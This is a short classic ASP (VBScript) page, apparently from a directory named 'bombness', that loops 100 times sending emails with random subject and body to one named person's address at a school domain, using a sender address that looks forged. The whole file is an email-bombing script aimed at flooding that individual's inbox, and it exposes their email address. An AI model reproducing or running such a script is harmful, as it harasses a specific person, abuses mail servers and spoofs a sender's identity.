<%@LANGUAGE="VBSCRIPT" CODEPAGE="1252"%><!--#include virtual="/bombness/includes/_mail.asp"--><%

i = 0
while i < 100
	i = i + 1
	sendmail_immed "sastrasinh_p@delbarton.org", "abuse@anonymousink.com", cstr(rnd), cstr(rnd)
response.write(".")
response.flush
wend

%>